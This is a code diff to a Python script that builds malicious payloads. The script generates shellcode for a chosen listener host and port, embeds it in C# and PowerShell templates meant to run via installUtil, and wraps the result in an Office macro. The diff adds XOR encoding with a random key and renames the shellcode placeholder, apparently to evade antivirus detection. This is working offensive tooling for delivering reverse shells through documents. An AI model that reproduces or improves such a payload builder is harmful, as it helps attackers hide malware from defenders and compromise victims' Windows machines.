@@ -4,6 +4,9 @@ import argparse
 import base64
 import subprocess
 import urllib2
+import random
+import string
+from itertools import *
 
 tmpPsFile = 'tmpps.txt'
 tmpShellFile = 'tmpshell.txt'
@@ -82,9 +85,15 @@ def chunkString(inString):
     return [ inString[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
 
 
+def xorEncodeFile(fileName, key):
+    fin = open(fileName, 'r')
+    data = fin.read().encode()
+    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
+    
+    return base64.b64encode(xored)
+    
 def encodeFile(fileName):
     fin = open(fileName, 'r')
-
     encoded = base64.b64encode(fin.read().encode())
 
     return encoded
@@ -94,7 +103,7 @@ def createPsScript(psScript):
     psLines = psScript.split('\n')
 
     for line in psLines:
-        if '$$$SHELLCODE$$$' in line:
+        if '$$$SCODE$$$' in line:
             fin = open(tmpShellFile)
             for lineShell in fin:
                 fout.write(lineShell)
@@ -103,7 +112,7 @@ def createPsScript(psScript):
 
     fout.close()
 
-def injectShellcode(script, runNormal):
+def injectShellcode(script, runNormal, key):
     fout = open(shellFile, 'w')
     scriptLines = script.split('\n')
 
@@ -114,6 +123,9 @@ def injectShellcode(script, runNormal):
         elif '$$$ENCODED$$$' in line:
             encoded = encodeFile(tmpPsFile)
             line = line.replace('$$$ENCODED$$$', '\"' + encoded + '\"')
+            
+        elif '$$$XORKEY$$$' in line:
+            line = line.replace('$$$XORKEY$$$', '\"' + key + '\"')
 
         fout.write(line + '\n')
 
@@ -146,10 +158,12 @@ if __name__== "__main__":
     parser.add_argument('-n', '--normal', action='store_true', help='Allow payload to be executed without installUtil')
     args = parser.parse_args()
 
+    xorKey = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+    
     createShellCode( args.arch, args.protocol, args.lhost, args.lport )
     shellScript = grabCSTemplate()
     psScript = grabPSTemplate()
     createPsScript(psScript)
-    injectShellcode( shellScript, args.normal )
+    injectShellcode( shellScript, args.normal, xorKey )
     createMacro(args.arch, args.windows)
     #createShellCode
